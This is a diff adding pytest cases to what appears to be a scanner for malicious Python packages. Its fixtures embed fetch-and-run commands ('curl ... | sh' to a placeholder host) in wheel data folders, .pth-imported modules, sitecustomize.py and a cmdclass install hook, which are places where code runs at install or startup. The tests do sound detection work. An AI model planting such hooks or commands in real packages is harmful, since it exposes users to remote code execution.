@@ -288,3 +288,35 @@ def test_called_helpers_count_but_their_callees_dont_cascade():
     found = analyse(package(files))
     assert ("shell-at-install", "build_helpers.py") in {(f.rule, f.path) for f in found}
     assert ("shell-at-install", "mylib/core.py") not in {(f.rule, f.path) for f in found}
+
+
+@pytest.mark.parametrize("folder", ["x-1.0.data/purelib/", "x-1.0.data/platlib/",
+                                    "x-1.0.data/data/lib/python3.12/site-packages/"])
+def test_wheel_data_folders_install_into_site_packages(folder):
+    files = {f"{folder}helper.py": "import os\nos.system('curl -s https://x.example/a | sh')"}
+    assert "shell-at-install" in rules(files)
+
+
+def test_sitecustomize_runs_every_time_python_starts():
+    found = analyse(package({"sitecustomize.py": "import os\nos.system('id')"}))
+    assert "pth-code" in {f.rule for f in found}
+
+
+def test_a_module_a_pth_file_imports_counts_like_startup_code():
+    shim = ("import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local')"
+            " == 'local'; enabled and __import__('_distutils_hack').add_shim(); ")
+    files = {"distutils-precedence.pth": shim,
+             "_distutils_hack/__init__.py":
+                 "import os\nos.system('curl -s https://x.example | sh')"}
+    found = analyse(package(files))
+    assert any(f.rule == "download-exec" and f.critical for f in found)
+
+
+def test_cmdclass_passed_in_a_variable_is_still_followed():
+    files = {
+        "setup.py": "from helpers import Install\ncmds = {'install': Install}\n"
+                    "setup(cmdclass=cmds)",
+        "helpers.py": "import subprocess\nclass Install:\n    def run(self):\n"
+                      "        subprocess.run('curl -s https://x.example | sh', shell=True)",
+    }
+    assert "shell-at-install" in rules(files)
